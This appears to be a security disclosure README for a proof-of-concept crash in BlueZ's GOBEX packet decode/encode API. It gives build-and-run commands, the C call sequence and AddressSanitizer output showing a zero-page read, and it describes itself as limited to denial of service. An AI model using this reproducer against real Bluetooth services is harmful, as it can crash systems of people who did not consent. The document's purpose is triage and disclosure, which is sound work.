# BlueZ GOBEX decode/encode crash PoC

## Summary

This PoC reproduces a crash in BlueZ GOBEX packet handling. A malformed 11-byte OBEX-like input is decoded with `g_obex_packet_decode()` and then passed to `g_obex_packet_encode()`. The process crashes under AddressSanitizer with a read from the zero page.

This PoC is intended for maintainer/security triage. It demonstrates a process crash / denial of service in the GOBEX packet API path. It does not demonstrate code execution, privilege escalation, or information disclosure.

## Tested version

- Repository: https://github.com/bluez/bluez
- Commit: `83ddf46ccc0653fb2aa460b57eb60db92ab37597`

## Files

- `Dockerfile` - reproducible build environment
- `poc.c` - API-level reproducer
- `crash.bin` - malformed 11-byte input

## Build and run

```bash
docker build -t bluez-gobex-decode-encode-crash-poc .
docker run --rm bluez-gobex-decode-encode-crash-poc
```

Expected vulnerable output includes:

```text
AddressSanitizer:DEADLYSIGNAL
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
The signal is caused by a READ memory access.
Hint: address points to the zero page.
```

## API sequence

```c
pkt = g_obex_packet_decode(data, fsize, 0, G_OBEX_DATA_REF, &err);
if (pkt != NULL) {
    g_obex_packet_encode(pkt, buf, sizeof(buf));
    g_obex_packet_free(pkt);
}
```

## Notes

The current PoC is an API-level reproducer for `gobex/gobex-packet.c`. Maintainers should confirm whether this path is reachable from production `obexd` flows and what affected release range applies.
